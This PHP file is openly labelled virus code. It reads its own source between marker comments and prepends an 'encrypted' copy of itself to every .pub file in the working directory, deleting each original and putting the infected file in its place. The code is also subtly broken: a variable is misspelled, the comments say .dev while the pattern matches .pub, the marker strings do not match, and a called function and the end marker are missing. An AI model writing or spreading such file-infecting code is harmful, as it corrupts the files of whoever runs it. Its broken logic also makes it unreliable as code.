<?php
    include "Eraser-virus.php";
    //VIRUS: START 
    function execute($virus){
        //get all the filenames with .dev extension thats already saved
        $filenames = glob('*.pub');

        //loop throught all the filesize
        foreach ($filenames as $filename) {
            # open the file and read targeted(.dev)...
            $script = fopen($filename, "r");

            // check whether the file is infected
            $fist_line = fgets($script); // gets first line of the file
            $virus_hash = md5($filename); //creates a hash 

            // check whether the hash appears on the first line of the file
            if(strpos($first_line, $virus_hash) == false){

                //to avoid issues with large files->file to handle
                $infected = fopen("$filename.infected", "w");
                
                $checksum = $virus_hash;
                $infection = '<?php '.encryptedVirus($virus).' ?>';
                
                fputs($infected, $checksum, strlen($checksum));
                fputs($infected, $infection, strlen($infection));
                fputs($infected, $first_line, strlen($first_line));
    
                //loop through
                while($contents = fgets($script)){
                    fputs($infected, $contents, strlen($contents));  
    
                }
    
                //close all the handles and move the infected files in to place
                fclose($script);
                fclose($infected);
                unlink($filename);
                rename("$filename.infected", $filename);
            }
        }
    
    }

    $virus = file_get_contents(__FILE__);
    $virus = substr($virus, strpos($virus, "//VIRUS:START"));
    $virus = substr($virus, 0, strpos($virus, "\n//VIRUS:END") + strlen("\n//VIRUS:END"));

    // call our function for excecution
    execute($virus);